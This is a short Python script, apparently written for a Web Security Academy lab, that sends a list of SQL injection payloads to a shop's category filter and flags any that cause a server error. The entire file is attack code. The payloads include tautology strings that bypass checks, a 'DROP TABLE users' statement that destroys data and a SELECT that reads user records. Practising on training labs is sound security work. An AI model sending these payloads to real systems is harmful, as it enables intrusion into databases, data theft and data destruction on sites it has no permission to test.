import requests

url = 'https://0a9b004c049711f2826e79e400e9000c.web-security-academy.net/filter?category=Food+%26+Drink'

# Set of SQL injection payloads
payloads = [
    "'",
    "1 or 1=1",
    "' or 1=1--",
    "' or 1=1#",
    "' or '1'='1",
    "' or '1'='1'--",
    "' or '1'='1'#",
    "'; DROP TABLE users--",
    "'; SELECT * FROM users WHERE name LIKE '%bob%'--",
]

for payload in payloads:
    params = {'category': payload}
    response = requests.get(url, params=params)
    
    if 'Internal Server Error' in response.text:
        print(f'SQL injection detected with payload: {payload}')
    else:
        print(f'No SQL injection detected with payload: {payload}')
